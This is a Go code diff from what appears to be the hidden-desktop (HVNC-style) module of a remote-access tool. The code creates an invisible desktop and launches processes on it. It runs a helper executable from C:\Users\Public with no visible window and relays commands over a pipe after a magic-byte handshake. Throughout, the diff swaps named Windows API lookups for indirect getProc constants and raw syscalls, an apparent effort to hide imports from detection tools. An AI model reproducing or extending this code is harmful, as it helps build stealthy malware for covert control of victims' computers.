@@ -15,24 +15,11 @@ import (
 
 var hdIsHost bool
 
-var (
-	procWTSQueryUserToken            = syscall.NewLazyDLL("wtsapi32.dll").NewProc("WTSQueryUserToken")
-	procDuplicateTokenEx             = syscall.NewLazyDLL("advapi32.dll").NewProc("DuplicateTokenEx")
-	procCreateProcessAsUserA         = syscall.NewLazyDLL("advapi32.dll").NewProc("CreateProcessAsUserA")
-	procProcessIdToSessionId         = hdKernel32.NewProc("ProcessIdToSessionId")
-	procWTSGetActiveConsoleSessionId = hdKernel32.NewProc("WTSGetActiveConsoleSessionId")
-	procGetStdHandle                 = hdKernel32.NewProc("GetStdHandle")
-	procPeekNamedPipe                = hdKernel32.NewProc("PeekNamedPipe")
-	procReadFile                     = hdKernel32.NewProc("ReadFile")
-	procWriteFile                    = hdKernel32.NewProc("WriteFile")
-)
-
 func hdFilePath() string {
 	var serial uint32
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	getVol := kernel32.NewProc("GetVolumeInformationA")
+	getVol := getProc(mKernel32, fGetVolumeInformationA)
 	root := append([]byte("C:\\"), 0)
-	getVol.Call(uintptr(unsafe.Pointer(&root[0])), 0, 0, uintptr(unsafe.Pointer(&serial)), 0, 0, 0, 0)
+	syscall.SyscallN(getVol, uintptr(unsafe.Pointer(&root[0])), 0, 0, uintptr(unsafe.Pointer(&serial)), 0, 0, 0, 0)
 	return fmt.Sprintf(`C:\Users\Public\%08x.g2`, serial^0xA73C915E)
 }
 
@@ -46,23 +33,27 @@ func readHDFile() string {
 
 func windowsSession() int {
 	var sid uint32
-	procProcessIdToSessionId.Call(uintptr(syscall.Getpid()), uintptr(unsafe.Pointer(&sid)))
+	p := getProc(mKernel32, fProcessIdToSessionId)
+	syscall.SyscallN(p, uintptr(syscall.Getpid()), uintptr(unsafe.Pointer(&sid)))
 	return int(sid)
 }
 
 func hdTakeHost() bool {
-	h, _, _ := procGetStdHandle.Call(^uintptr(0) - 9) // STD_INPUT_HANDLE = -10
+	stdHandle := getProc(mKernel32, fGetStdHandle)
+	h, _, _ := syscall.SyscallN(stdHandle, ^uintptr(0)-9) // STD_INPUT_HANDLE = -10
 	if h == 0 || h == uintptr(^uint(0)) {
 		return false
 	}
 	var mag [4]byte
 	var got uint32
-	r, _, _ := procPeekNamedPipe.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&got)), 0, 0)
+	peek := getProc(mKernel32, fPeekNamedPipe)
+	r, _, _ := syscall.SyscallN(peek, h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&got)), 0, 0)
 	if r == 0 || got < 4 || mag != [4]byte{0xA7, 0x3C, 0x91, 0x5E} {
 		return false
 	}
 	var n uint32
-	procReadFile.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&n)), 0)
+	rf := getProc(mKernel32, fReadFile)
+	syscall.SyscallN(rf, h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&n)), 0)
 	hdIsHost = true
 	return true
 }
@@ -72,7 +63,8 @@ func hdOwnerLoop() {
 	if err := hdEnsure(); err != nil {
 		return
 	}
-	procSetThreadDesktop.Call(uintptr(hdDesktop))
+	setDesk := getProc(mUser32, fSetThreadDesktop)
+	syscall.SyscallN(setDesk, uintptr(hdDesktop))
 	hdSpawn(`C:\Windows\System32\notepad.exe`)
 	hdMakeWindow()
 	hdStarted = true
@@ -88,23 +80,26 @@ func hdOwnerLoop() {
 func hdHostMain() int {
 	hdIsHost = true
 	go hdOwnerLoop()
-	in, _, _ := procGetStdHandle.Call(^uintptr(0) - 9)
-	out, _, _ := procGetStdHandle.Call(^uintptr(0) - 11)
+	stdHandle := getProc(mKernel32, fGetStdHandle)
+	rf := getProc(mKernel32, fReadFile)
+	wf := getProc(mKernel32, fWriteFile)
+	in, _, _ := syscall.SyscallN(stdHandle, ^uintptr(0)-9)
+	out, _, _ := syscall.SyscallN(stdHandle, ^uintptr(0)-11)
 	for {
 		var n uint32
 		var got uint32
-		r, _, _ := procReadFile.Call(in, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got)), 0)
+		r, _, _ := syscall.SyscallN(rf, in, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got)), 0)
 		if r == 0 || n == 0 || n > 4096 {
 			return 0
 		}
 		buf := make([]byte, n)
-		procReadFile.Call(in, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&got)), 0)
+		syscall.SyscallN(rf, in, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&got)), 0)
 		resp := handleHiddenDesktop(string(buf))
 		nb := uint32(len(resp))
 		body := []byte(resp)
-		procWriteFile.Call(out, uintptr(unsafe.Pointer(&nb)), 4, uintptr(unsafe.Pointer(&got)), 0)
+		syscall.SyscallN(wf, out, uintptr(unsafe.Pointer(&nb)), 4, uintptr(unsafe.Pointer(&got)), 0)
 		if nb > 0 {
-			procWriteFile.Call(out, uintptr(unsafe.Pointer(&body[0])), uintptr(nb), uintptr(unsafe.Pointer(&got)), 0)
+			syscall.SyscallN(wf, out, uintptr(unsafe.Pointer(&body[0])), uintptr(nb), uintptr(unsafe.Pointer(&got)), 0)
 		}
 	}
 }
@@ -116,7 +111,8 @@ func hdViaHost(cmd string) string {
 	var pi syscall.ProcessInformation
 	si.Cb = uint32(unsafe.Sizeof(si))
 	cmdLine, _ := syscall.BytePtrFromString(`C:\Users\Public\hdcmdrun.exe`)
-	r, _, err := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
+	createProc := getProc(mKernel32, fCreateProcessA)
+	r, _, err := syscall.SyscallN(createProc,
 		0, uintptr(unsafe.Pointer(cmdLine)), 0, 0, 0, 0x08000000, 0, 0,
 		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
 	)
@@ -169,5 +165,3 @@ func launchHDHost() error {
 	hdFromChild = uintptr(syscall.Handle(rr.Fd()))
 	return nil
 }
-
-
